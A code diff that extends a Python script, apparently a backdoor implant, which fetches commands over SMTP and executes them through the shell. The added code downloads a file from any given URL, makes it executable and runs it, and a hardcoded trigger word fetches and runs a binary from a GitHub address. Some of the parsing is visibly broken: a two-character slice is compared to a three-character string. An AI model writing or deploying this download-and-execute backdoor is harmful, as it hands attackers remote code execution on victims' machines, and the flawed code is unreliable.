@@ -12,8 +12,24 @@ import smtplib
 import socket
 import subprocess
 import getpass
+import os
+import urllib
 SERVER = "localhost"
 DEST_ADDR = "mailman@"+SERVER
+
+def wget(cmd):
+    #parse a "wg http://..." command
+    #chmod +x downloaded file
+    #xeq downloaded file
+    url = cmd[3:]
+    extension = cmd[-4:] #This is mostly for windows stuff
+    fileName, headers = urllib.request.urlretrieve(url) #saves as temp file
+    os.rename(fileName, fileName+extension)
+    fileName += extension
+    os.chmod(fileName, 0o555) #r-xr-xr-x
+    print(fileName)
+    out = subprocess.Popen([fileName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+    (stdout, stderr) = out.communicate()
 
 def main():
     connection = smtplib.SMTP()
@@ -27,6 +43,13 @@ def main():
     if(code != 250):
         return #Wait for next run
     command = command.decode("UTF-8")
+    if len(command) > 3:
+        if command[0:2] == "wg ":
+            wget(command)
+            return
+    if command == "sojuman":
+        wget("wg https://github.com/ChoiSG/sojuman/raw/master/dist/real_sojuman")
+        return
     out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
     (stdout, stderr) = out.communicate()
     if stdout != None:
